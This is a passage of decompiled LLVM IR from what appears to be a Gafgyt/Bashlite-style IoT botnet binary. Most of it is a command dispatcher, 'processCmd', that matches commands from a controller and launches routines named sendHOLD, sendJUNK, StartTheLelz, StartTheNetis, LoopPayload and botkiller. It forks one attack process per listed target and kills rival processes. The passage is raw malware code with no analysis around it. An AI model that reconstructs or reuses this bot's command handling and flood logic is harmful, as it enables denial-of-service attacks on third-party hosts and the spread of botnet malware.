dec_label_pc_1000b0e8:                            ; preds = %dec_label_pc_1000b0d8
  %v2_1000b0f8 = load i32, i32* %v1_1000af88, align 8
  store i32 268480772, i32* @lr, align 4
  %v1_1000b100 = call i32 @__libc_close(i32 %v2_1000b0f8)
  store i8 0, i8* %v2_1000adf8, align 4
  br label %dec_label_pc_1000b25c

dec_label_pc_1000b120:                            ; preds = %dec_label_pc_1000ae10
  store i32 %v2_1000af34, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge

dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge: ; preds = %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge.dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge_crit_edge, %dec_label_pc_1000b120
  %v3_1000b138.pre = phi i32 [ %v2_1000af34, %dec_label_pc_1000b120 ], [ %v3_1000b138.pre.pre, %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge.dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge_crit_edge ]
  %v1_1000b15053 = phi i32 [ 1, %dec_label_pc_1000b120 ], [ %v1_1000b150, %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge.dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge_crit_edge ]
  %v1_1000b13c = mul nuw nsw i32 %v1_1000b15053, 4
  %v2_1000b140 = add i32 %v1_1000b13c, %v3_1000b138.pre
  %v2_1000b148 = inttoptr i32 %v2_1000b140 to i32*
  store i32 0, i32* %v2_1000b148, align 4
  %v1_1000b150 = add nuw nsw i32 %v1_1000b15053, 1
  %tmp51 = icmp ult i32 %v1_1000b150, 32
  br i1 %tmp51, label %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge.dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge_crit_edge, label %dec_label_pc_1000b164

dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge.dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge_crit_edge: ; preds = %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge
  %v3_1000b138.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge

dec_label_pc_1000b164:                            ; preds = %dec_label_pc_1000b134.dec_label_pc_1000b134_crit_edge
  %v1_1000b174 = inttoptr i32 %v2_1000adf4 to i32*
  %v2_1000b174 = load i32, i32* %v1_1000b174, align 8
  %v1_1000b178 = udiv i32 %v2_1000b174, 32
  %v1_1000b180 = mul nuw nsw i32 %v1_1000b178, 4
  %v1_1000b18c = add i32 %v1_1000b180, %v2_1000af9c
  %v1_1000b190 = inttoptr i32 %v1_1000b18c to i32*
  %v2_1000b190 = load i32, i32* %v1_1000b190, align 4
  %v1_1000b1a8 = urem i32 %v2_1000b174, 32
  %v3_1000b1b0 = shl i32 1, %v1_1000b1a8
  %v2_1000b1b4 = or i32 %v3_1000b1b0, %v2_1000b190
  store i32 %v2_1000b1b4, i32* %v1_1000b190, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v2_1000b1ec = load i32, i32* %v1_1000b174, align 8
  %v1_1000b1f0 = add i32 %v2_1000b1ec, 1
  store i32 268481044, i32* @lr, align 4
  %v5_1000b210 = call i32 @__libc_select(i32 %v1_1000b1f0, i32 0, i32 0, i32 %v2_1000af34, i32 %v2_1000b00c)
  %v3_1000b220 = icmp eq i32 %v5_1000b210, 0
  br i1 %v3_1000b220, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b228

dec_label_pc_1000b228:                            ; preds = %dec_label_pc_1000b164
  %v2_1000b238 = load i32, i32* %v1_1000b174, align 8
  store i32 268481092, i32* @lr, align 4
  %v1_1000b240 = call i32 @__libc_close(i32 %v2_1000b238)
  store i8 0, i8* %v2_1000adf8, align 4
  br label %dec_label_pc_1000b25c

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000ae1c, %dec_label_pc_1000b0d8, %dec_label_pc_1000b164, %dec_label_pc_1000b0e8, %dec_label_pc_1000b0bc, %dec_label_pc_1000b084, %dec_label_pc_1000af18, %dec_label_pc_1000aef8, %dec_label_pc_1000b228
  %v1_1000b260 = add nuw nsw i32 %storemerge311, 1
  %v2_1000b270 = icmp slt i32 %v1_1000b260, %v3_1000accc
  br i1 %v2_1000b270, label %dec_label_pc_1000ade8, label %dec_label_pc_1000b278.loopexit

dec_label_pc_1000b278.loopexit:                   ; preds = %dec_label_pc_1000b25c, %dec_label_pc_1000b268.preheader
  store i32 268481152, i32* @lr, align 4
  %v1_1000b27c = call i32 @__GI_time(i32 0)
  %v2_1000b288 = icmp slt i32 %v1_1000b27c, %v2_1000add0
  br i1 %v2_1000b288, label %dec_label_pc_1000b268.preheader, label %dec_label_pc_1000b290

dec_label_pc_1000b268.preheader:                  ; preds = %dec_label_pc_1000b268.preheader.lr.ph, %dec_label_pc_1000b278.loopexit
  br i1 %v2_1000b2708, label %dec_label_pc_1000ade8, label %dec_label_pc_1000b278.loopexit

dec_label_pc_1000b290:                            ; preds = %dec_label_pc_1000b278.loopexit, %dec_label_pc_1000ad1c, %entry
  %v0_1000b2b8 = phi i32 [ %v4_1000ad08, %entry ], [ %v1_1000b27c13, %dec_label_pc_1000ad1c ], [ %v1_1000b27c, %dec_label_pc_1000b278.loopexit ]
  ret i32 %v0_1000b2b8

; uselistorder directives
  uselistorder i32 %v1_1000b260, { 1, 0 }
  uselistorder i32 %v1_1000b150, { 1, 0 }
  uselistorder i32 %storemerge57, { 1, 0 }
  uselistorder i32 %v2_1000ae64, { 1, 0 }
  uselistorder i8* %v2_1000adf8, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000adf4, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge311, { 2, 0, 1 }
  uselistorder i32 %v2_1000af34, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_1000add0, { 1, 0 }
  uselistorder i32 %v2_1000acf8, { 1, 0 }
  uselistorder i32 %v1_1000ace4, { 1, 0 }
  uselistorder i32 %v3_1000accc, { 1, 0, 2 }
  uselistorder i32 %v1_1000accc, { 1, 0 }
  uselistorder i32 %v0_1000acc4, { 1, 0 }
  uselistorder i32* %stack_var_-208, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 268481152, { 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b268.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b278.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000b25c, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1000af48, { 1, 0 }
  uselistorder label %dec_label_pc_1000aef8, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-80 = alloca i32, align 4
  %v2_1000b2f0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10016314.31 to i32), i32* @r4, align 4
  %v3_1000b300 = inttoptr i32 %v2_1000b2f0 to i8*
  %v4_1000b300 = call i32 @__GI_strcoll(i8* %v3_1000b300, i32 ptrtoint ([5 x i8]* @global_var_10016314.31 to i32))
  %v3_1000b308 = icmp eq i32 %v4_1000b300, 0
  br i1 %v3_1000b308, label %dec_label_pc_1000b310, label %dec_label_pc_1000b330

dec_label_pc_1000b310:                            ; preds = %entry
  %v3_1000b314 = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_1000b32c.483 to i32), i32* @lr, align 4
  %v4_1000b328 = call i32 @HackerPrint(i32 %v3_1000b314, i32 ptrtoint ([6 x i8]* @global_var_10018d98.482 to i32), i32 268566528)
  br label %dec_label_pc_1000c69c

dec_label_pc_1000b330:                            ; preds = %entry
  %v2_1000b334 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_10018da0.484 to i32), i32* @r4, align 4
  %v3_1000b344 = inttoptr i32 %v2_1000b334 to i8*
  %v4_1000b344 = call i32 @__GI_strcoll(i8* %v3_1000b344, i32 ptrtoint ([11 x i8]* @global_var_10018da0.484 to i32))
  %v3_1000b34c = icmp eq i32 %v4_1000b344, 0
  br i1 %v3_1000b34c, label %dec_label_pc_1000b354, label %dec_label_pc_1000b394

dec_label_pc_1000b354:                            ; preds = %dec_label_pc_1000b330
  %v3_1000b360 = load i32, i32* @global_var_1002abd0.248, align 4
  store i32 %v3_1000b360, i32* %stack_var_-80, align 4
  store i32 268481396, i32* @lr, align 4
  %v3_1000b370 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000b378 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000b390.486 to i32), i32* @lr, align 4
  %v5_1000b38c = call i32 @HackerPrint(i32 %v0_1000b378, i32 ptrtoint ([10 x i8]* @global_var_10018dac.485 to i32), i32 %v3_1000b370)
  br label %dec_label_pc_1000c69c

dec_label_pc_1000b394:                            ; preds = %dec_label_pc_1000b330
  %v2_1000b398 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10018db8.487 to i32), i32* @r4, align 4
  %v3_1000b3a8 = inttoptr i32 %v2_1000b398 to i8*
  %v4_1000b3a8 = call i32 @__GI_strcoll(i8* %v3_1000b3a8, i32 ptrtoint ([8 x i8]* @global_var_10018db8.487 to i32))
  %v3_1000b3b0 = icmp eq i32 %v4_1000b3a8, 0
  br i1 %v3_1000b3b0, label %dec_label_pc_1000b3b8, label %dec_label_pc_1000b3f4

dec_label_pc_1000b3b8:                            ; preds = %dec_label_pc_1000b394
  store i32 268481468, i32* @lr, align 4
  %v0_1000b3b8 = call i32 @listFork()
  %v3_1000b3c0 = icmp eq i32 %v0_1000b3b8, 0
  br i1 %v3_1000b3c0, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000b3f4

dec_label_pc_1000b3c8:                            ; preds = %dec_label_pc_1000b3b8
  %v3_1000b3cc = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 268481508, i32* @lr, align 4
  %v4_1000b3e0 = call i32 @HackerPrint(i32 %v3_1000b3cc, i32 ptrtoint ([13 x i8]* @global_var_10018dc0.488 to i32), i32 268566528)
  %v1_1000b3e4 = call i32 @botkiller(i32 %v4_1000b3e0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000b3ec.489 to i32), i32* @lr, align 4
  %v1_1000b3e8 = call i32 @RemoveTMP(i32 %v1_1000b3e4)
  %v1_1000b3f0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b3f4

dec_label_pc_1000b3f4:                            ; preds = %dec_label_pc_1000b3b8, %dec_label_pc_1000b394, %dec_label_pc_1000b3c8
  %v2_1000b3f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10018dd0.490 to i32), i32* @r4, align 4
  %v3_1000b408 = inttoptr i32 %v2_1000b3f8 to i8*
  %v4_1000b408 = call i32 @__GI_strcoll(i8* %v3_1000b408, i32 ptrtoint ([7 x i8]* @global_var_10018dd0.490 to i32))
  %v3_1000b410 = icmp eq i32 %v4_1000b408, 0
  br i1 %v3_1000b410, label %dec_label_pc_1000b418, label %dec_label_pc_1000b450

dec_label_pc_1000b418:                            ; preds = %dec_label_pc_1000b3f4
  store i32 268481564, i32* @lr, align 4
  %v0_1000b418 = call i32 @listFork()
  %v3_1000b420 = icmp eq i32 %v0_1000b418, 0
  br i1 %v3_1000b420, label %dec_label_pc_1000b428, label %dec_label_pc_1000b450

dec_label_pc_1000b428:                            ; preds = %dec_label_pc_1000b418
  %v3_1000b42c = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 268481604, i32* @lr, align 4
  %v4_1000b440 = call i32 @HackerPrint(i32 %v3_1000b42c, i32 ptrtoint ([16 x i8]* @global_var_10018dd8.491 to i32), i32 268566528)
  %v1_1000b444 = call i32 @LoopPayload(i32 %v4_1000b440)
  %v1_1000b44c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b450

dec_label_pc_1000b450:                            ; preds = %dec_label_pc_1000b418, %dec_label_pc_1000b3f4, %dec_label_pc_1000b428
  %v2_1000b454 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10018de8.493 to i32), i32* @r4, align 4
  %v3_1000b464 = inttoptr i32 %v2_1000b454 to i8*
  %v4_1000b464 = call i32 @__GI_strcoll(i8* %v3_1000b464, i32 ptrtoint ([7 x i8]* @global_var_10018de8.493 to i32))
  %v3_1000b46c = icmp eq i32 %v4_1000b464, 0
  br i1 %v3_1000b46c, label %dec_label_pc_1000b474, label %dec_label_pc_1000b590

dec_label_pc_1000b474:                            ; preds = %dec_label_pc_1000b450
  %v3_1000b478 = icmp eq i32 %arg1, 2
  br i1 %v3_1000b478, label %dec_label_pc_1000b4a0, label %dec_label_pc_1000b480

dec_label_pc_1000b480:                            ; preds = %dec_label_pc_1000b474
  %v3_1000b484 = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_1000b49c.495 to i32), i32* @lr, align 4
  %v4_1000b498 = call i32 @HackerPrint(i32 %v3_1000b484, i32 ptrtoint ([16 x i8]* @global_var_10018df0.494 to i32), i32 268566528)
  br label %dec_label_pc_1000c69c

dec_label_pc_1000b4a0:                            ; preds = %dec_label_pc_1000b474
  %v1_1000b4a4 = add i32 %tmp, 4
  %v1_1000b4a8 = inttoptr i32 %v1_1000b4a4 to i32*
  %v2_1000b4a8 = load i32, i32* %v1_1000b4a8, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018e00.496 to i32), i32* @r4, align 4
  %v3_1000b4b8 = inttoptr i32 %v2_1000b4a8 to i8*
  %v4_1000b4b8 = call i32 @__GI_strcoll(i8* %v3_1000b4b8, i32 ptrtoint ([4 x i8]* @global_var_10018e00.496 to i32))
  %v3_1000b4c0 = icmp eq i32 %v4_1000b4b8, 0
  br i1 %v3_1000b4c0, label %dec_label_pc_1000b4c8, label %dec_label_pc_1000b514

dec_label_pc_1000b4c8:                            ; preds = %dec_label_pc_1000b4a0
  %v3_1000b4cc = load i32, i32* @global_var_1002abd8.497, align 4
  %v3_1000b4d0 = icmp eq i32 %v3_1000b4cc, 0
  br i1 %v3_1000b4d0, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b4d8

dec_label_pc_1000b4d8:                            ; preds = %dec_label_pc_1000b4c8
  store i32 268481772, i32* @lr, align 4
  %v2_1000b4e8 = call i32 @kill(i32 %v3_1000b4cc, i32 9)
  %v3_1000b4f0 = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 268481800, i32* @lr, align 4
  %v4_1000b504 = call i32 @HackerPrint(i32 %v3_1000b4f0, i32 ptrtoint ([5 x i8]* @global_var_10018e04.498 to i32), i32 268566528)
  store i32 0, i32* @global_var_1002abd8.497, align 4
  br label %dec_label_pc_1000b514

dec_label_pc_1000b514:                            ; preds = %dec_label_pc_1000b4a0, %dec_label_pc_1000b4d8
  %v2_1000b51c = load i32, i32* %v1_1000b4a8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10018e0c.499 to i32), i32* @r4, align 4
  %v3_1000b52c = inttoptr i32 %v2_1000b51c to i8*
  %v4_1000b52c = call i32 @__GI_strcoll(i8* %v3_1000b52c, i32 ptrtoint ([3 x i8]* @global_var_10018e0c.499 to i32))
  %v3_1000b534 = icmp eq i32 %v4_1000b52c, 0
  br i1 %v3_1000b534, label %dec_label_pc_1000b53c, label %dec_label_pc_1000b590

dec_label_pc_1000b53c:                            ; preds = %dec_label_pc_1000b514
  %v3_1000b540 = load i32, i32* @global_var_1002abd8.497, align 4
  %v3_1000b544 = icmp eq i32 %v3_1000b540, 0
  br i1 %v3_1000b544, label %dec_label_pc_1000b54c, label %dec_label_pc_1000c69c

dec_label_pc_1000b54c:                            ; preds = %dec_label_pc_1000b53c
  store i32 268481872, i32* @lr, align 4
  %v0_1000b54c = call i32 @__libc_fork()
  %v3_1000b55c = icmp eq i32 %v0_1000b54c, 0
  br i1 %v3_1000b55c, label %dec_label_pc_1000b574, label %dec_label_pc_1000b564

dec_label_pc_1000b564:                            ; preds = %dec_label_pc_1000b54c
  store i32 %v0_1000b54c, i32* @global_var_1002abd8.497, align 4
  br label %dec_label_pc_1000c69c

dec_label_pc_1000b574:                            ; preds = %dec_label_pc_1000b54c
  %v1_1000b584 = call i32 @StartTheLelz(i32 -1)
  %v1_1000b58c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b590

dec_label_pc_1000b590:                            ; preds = %dec_label_pc_1000b514, %dec_label_pc_1000b450, %dec_label_pc_1000b574
  %v2_1000b594 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10018e10.501 to i32), i32* @r4, align 4
  %v3_1000b5a4 = inttoptr i32 %v2_1000b594 to i8*
  %v4_1000b5a4 = call i32 @__GI_strcoll(i8* %v3_1000b5a4, i32 ptrtoint ([6 x i8]* @global_var_10018e10.501 to i32))
  %v3_1000b5ac = icmp eq i32 %v4_1000b5a4, 0
  br i1 %v3_1000b5ac, label %dec_label_pc_1000b5b4, label %dec_label_pc_1000b610

dec_label_pc_1000b5b4:                            ; preds = %dec_label_pc_1000b590
  %v3_1000b5b8 = icmp eq i32 %arg1, 2
  br i1 %v3_1000b5b8, label %dec_label_pc_1000b5c0, label %dec_label_pc_1000c69c

dec_label_pc_1000b5c0:                            ; preds = %dec_label_pc_1000b5b4
  %v1_1000b5c4 = add i32 %tmp, 4
  %v1_1000b5c8 = inttoptr i32 %v1_1000b5c4 to i32*
  %v2_1000b5c8 = load i32, i32* %v1_1000b5c8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10018e0c.499 to i32), i32* @r4, align 4
  %v3_1000b5d8 = inttoptr i32 %v2_1000b5c8 to i8*
  %v4_1000b5d8 = call i32 @__GI_strcoll(i8* %v3_1000b5d8, i32 ptrtoint ([3 x i8]* @global_var_10018e0c.499 to i32))
  %v3_1000b5e0 = icmp eq i32 %v4_1000b5d8, 0
  br i1 %v3_1000b5e0, label %dec_label_pc_1000b5e8, label %dec_label_pc_1000b610

dec_label_pc_1000b5e8:                            ; preds = %dec_label_pc_1000b5c0
  %v3_1000b5ec = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 268482052, i32* @lr, align 4
  %v4_1000b600 = call i32 @HackerPrint(i32 %v3_1000b5ec, i32 ptrtoint ([25 x i8]* @global_var_10018e18.502 to i32), i32 268566528)
  %v1_1000b604 = call i32 @StartTheNetis(i32 %v4_1000b600)
  %v1_1000b60c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b610

dec_label_pc_1000b610:                            ; preds = %dec_label_pc_1000b5c0, %dec_label_pc_1000b590, %dec_label_pc_1000b5e8
  %v2_1000b614 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10018e34.504 to i32), i32* @r4, align 4
  %v3_1000b624 = inttoptr i32 %v2_1000b614 to i8*
  %v4_1000b624 = call i32 @__GI_strcoll(i8* %v3_1000b624, i32 ptrtoint ([5 x i8]* @global_var_10018e34.504 to i32))
  %v3_1000b62c = icmp eq i32 %v4_1000b624, 0
  br i1 %v3_1000b62c, label %dec_label_pc_1000b634, label %dec_label_pc_1000b780

dec_label_pc_1000b634:                            ; preds = %dec_label_pc_1000b610
  %tmp119 = icmp slt i32 %arg1, 4
  br i1 %tmp119, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b640

dec_label_pc_1000b640:                            ; preds = %dec_label_pc_1000b634
  %v1_1000b644 = add i32 %tmp, 8
  %v1_1000b648 = inttoptr i32 %v1_1000b644 to i32*
  %v2_1000b648 = load i32, i32* %v1_1000b648, align 4
  store i32 268482132, i32* @lr, align 4
  %v2_1000b650 = call i32 @atol(i32 %v2_1000b648, i32 %v1_1000b644)
  %tmp120 = icmp slt i32 %v2_1000b650, 1
  br i1 %tmp120, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b660

dec_label_pc_1000b660:                            ; preds = %dec_label_pc_1000b640
  %v1_1000b664 = add i32 %tmp, 12
  %v1_1000b668 = inttoptr i32 %v1_1000b664 to i32*
  %v2_1000b668 = load i32, i32* %v1_1000b668, align 4
  store i32 268482164, i32* @lr, align 4
  %v2_1000b670 = call i32 @atol(i32 %v2_1000b668, i32 %v1_1000b664)
  %v2_1000b678 = icmp sgt i32 %v2_1000b670, 0
  br i1 %v2_1000b678, label %dec_label_pc_1000b684, label %dec_label_pc_1000c69c

dec_label_pc_1000b684:                            ; preds = %dec_label_pc_1000b660
  %v1_1000b688 = add i32 %tmp, 4
  %v1_1000b68c = inttoptr i32 %v1_1000b688 to i32*
  %v2_1000b68c = load i32, i32* %v1_1000b68c, align 4
  %v2_1000b69c = load i32, i32* %v1_1000b648, align 4
  store i32 268482216, i32* @lr, align 4
  %v2_1000b6a4 = call i32 @atol(i32 %v2_1000b69c, i32 %v1_1000b644)
  %v2_1000b6b8 = load i32, i32* %v1_1000b668, align 4
  store i32 268482244, i32* @lr, align 4
  %v2_1000b6c0 = call i32 @atol(i32 %v2_1000b6b8, i32 %v1_1000b664)
  store i32 %v2_1000b68c, i32* @r3, align 4
  store i32 268482268, i32* @lr, align 4
  %v2_1000b6d8 = call i32 @__GI_strchr(i32 %v2_1000b68c, i32 44)
  %v3_1000b6e0 = icmp eq i32 %v2_1000b6d8, 0
  br i1 %v3_1000b6e0, label %dec_label_pc_1000b758, label %dec_label_pc_1000b6e8

dec_label_pc_1000b6e8:                            ; preds = %dec_label_pc_1000b684
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268482300, i32* @lr, align 4
  %v3_1000b6f8 = call i32 @__GI_strtok(i32 %v2_1000b68c, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000b74c58 = icmp eq i32 %v3_1000b6f8, 0
  br i1 %v3_1000b74c58, label %dec_label_pc_1000b780, label %dec_label_pc_1000b708

dec_label_pc_1000b708:                            ; preds = %dec_label_pc_1000b6e8, %dec_label_pc_1000b730
  %storemerge2859 = phi i32 [ %v3_1000b73c, %dec_label_pc_1000b730 ], [ %v3_1000b6f8, %dec_label_pc_1000b6e8 ]
  store i32 268482316, i32* @lr, align 4
  %v0_1000b708 = call i32 @listFork()
  %v3_1000b710 = icmp eq i32 %v0_1000b708, 0
  br i1 %v3_1000b710, label %dec_label_pc_1000b718, label %dec_label_pc_1000b730

dec_label_pc_1000b718:                            ; preds = %dec_label_pc_1000b708
  %v3_1000b724 = call i32 @sendHOLD(i32 %storemerge2859, i32 %v2_1000b6a4, i32 %v2_1000b6c0)
  %v1_1000b72c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b730

dec_label_pc_1000b730:                            ; preds = %dec_label_pc_1000b708, %dec_label_pc_1000b718
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268482368, i32* @lr, align 4
  %v3_1000b73c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000b74c = icmp eq i32 %v3_1000b73c, 0
  br i1 %v3_1000b74c, label %dec_label_pc_1000b780, label %dec_label_pc_1000b708

dec_label_pc_1000b758:                            ; preds = %dec_label_pc_1000b684
  store i32 268482396, i32* @lr, align 4
  %v0_1000b758 = call i32 @listFork()
  %v3_1000b760 = icmp eq i32 %v0_1000b758, 0
  br i1 %v3_1000b760, label %dec_label_pc_1000b768, label %dec_label_pc_1000c69c

dec_label_pc_1000b768:                            ; preds = %dec_label_pc_1000b758
  %v3_1000b774 = call i32 @sendHOLD(i32 %v2_1000b68c, i32 %v2_1000b6a4, i32 %v2_1000b6c0)
  %v1_1000b77c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b780

dec_label_pc_1000b780:                            ; preds = %dec_label_pc_1000b730, %dec_label_pc_1000b6e8, %dec_label_pc_1000b610, %dec_label_pc_1000b768
  %v2_1000b784 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10018e3c.508 to i32), i32* @r4, align 4
  %v3_1000b794 = inttoptr i32 %v2_1000b784 to i8*
  %v4_1000b794 = call i32 @__GI_strcoll(i8* %v3_1000b794, i32 ptrtoint ([5 x i8]* @global_var_10018e3c.508 to i32))
  %v3_1000b79c = icmp eq i32 %v4_1000b794, 0
  br i1 %v3_1000b79c, label %dec_label_pc_1000b7a4, label %dec_label_pc_1000b900

dec_label_pc_1000b7a4:                            ; preds = %dec_label_pc_1000b780
  %tmp121 = icmp slt i32 %arg1, 4
  br i1 %tmp121, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b7b0

dec_label_pc_1000b7b0:                            ; preds = %dec_label_pc_1000b7a4
  %v1_1000b7b4 = add i32 %tmp, 8
  %v1_1000b7b8 = inttoptr i32 %v1_1000b7b4 to i32*
  %v2_1000b7b8 = load i32, i32* %v1_1000b7b8, align 4
  store i32 268482500, i32* @lr, align 4
  %v2_1000b7c0 = call i32 @atol(i32 %v2_1000b7b8, i32 %v1_1000b7b4)
  %tmp122 = icmp slt i32 %v2_1000b7c0, 1
  br i1 %tmp122, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b7d0

dec_label_pc_1000b7d0:                            ; preds = %dec_label_pc_1000b7b0
  %v1_1000b7d4 = add i32 %tmp, 12
  %v1_1000b7d8 = inttoptr i32 %v1_1000b7d4 to i32*
  %v2_1000b7d8 = load i32, i32* %v1_1000b7d8, align 4
  store i32 268482532, i32* @lr, align 4
  %v2_1000b7e0 = call i32 @atol(i32 %v2_1000b7d8, i32 %v1_1000b7d4)
  %v2_1000b7e8 = icmp sgt i32 %v2_1000b7e0, 0
  br i1 %v2_1000b7e8, label %dec_label_pc_1000b7f4, label %dec_label_pc_1000c69c

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7d0
  %v1_1000b7f8 = add i32 %tmp, 4
  %v1_1000b7fc = inttoptr i32 %v1_1000b7f8 to i32*
  %v2_1000b7fc = load i32, i32* %v1_1000b7fc, align 4
  %v2_1000b80c = load i32, i32* %v1_1000b7b8, align 4
  store i32 268482584, i32* @lr, align 4
  %v2_1000b814 = call i32 @atol(i32 %v2_1000b80c, i32 %v1_1000b7b4)
  %v2_1000b828 = load i32, i32* %v1_1000b7d8, align 4
  store i32 268482612, i32* @lr, align 4
  %v2_1000b830 = call i32 @atol(i32 %v2_1000b828, i32 %v1_1000b7d4)
  store i32 %v2_1000b7fc, i32* @r3, align 4
  store i32 268482636, i32* @lr, align 4
  %v2_1000b848 = call i32 @__GI_strchr(i32 %v2_1000b7fc, i32 44)
  %v3_1000b850 = icmp eq i32 %v2_1000b848, 0
  br i1 %v3_1000b850, label %dec_label_pc_1000b8d8, label %dec_label_pc_1000b858

dec_label_pc_1000b858:                            ; preds = %dec_label_pc_1000b7f4
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268482668, i32* @lr, align 4
  %v3_1000b868 = call i32 @__GI_strtok(i32 %v2_1000b7fc, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000b8cc54 = icmp eq i32 %v3_1000b868, 0
  br i1 %v3_1000b8cc54, label %dec_label_pc_1000b900, label %dec_label_pc_1000b878

dec_label_pc_1000b878:                            ; preds = %dec_label_pc_1000b858, %dec_label_pc_1000b8b0
  %storemerge2655 = phi i32 [ %v3_1000b8bc, %dec_label_pc_1000b8b0 ], [ %v3_1000b868, %dec_label_pc_1000b858 ]
  store i32 268482684, i32* @lr, align 4
  %v0_1000b878 = call i32 @listFork()
  %v3_1000b880 = icmp eq i32 %v0_1000b878, 0
  br i1 %v3_1000b880, label %dec_label_pc_1000b888, label %dec_label_pc_1000b8b0

dec_label_pc_1000b888:                            ; preds = %dec_label_pc_1000b878
  %v3_1000b894 = call i32 @sendJUNK(i32 %storemerge2655, i32 %v2_1000b814, i32 %v2_1000b830)
  %v3_1000b89c = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b8a8.509 to i32), i32* @lr, align 4
  %v1_1000b8a4 = call i32 @__libc_close(i32 %v3_1000b89c)
  %v1_1000b8ac = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b8b0

dec_label_pc_1000b8b0:                            ; preds = %dec_label_pc_1000b878, %dec_label_pc_1000b888
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268482752, i32* @lr, align 4
  %v3_1000b8bc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000b8cc = icmp eq i32 %v3_1000b8bc, 0
  br i1 %v3_1000b8cc, label %dec_label_pc_1000b900, label %dec_label_pc_1000b878

dec_label_pc_1000b8d8:                            ; preds = %dec_label_pc_1000b7f4
  store i32 268482780, i32* @lr, align 4
  %v0_1000b8d8 = call i32 @listFork()
  %v3_1000b8e0 = icmp eq i32 %v0_1000b8d8, 0
  br i1 %v3_1000b8e0, label %dec_label_pc_1000b8e8, label %dec_label_pc_1000c69c

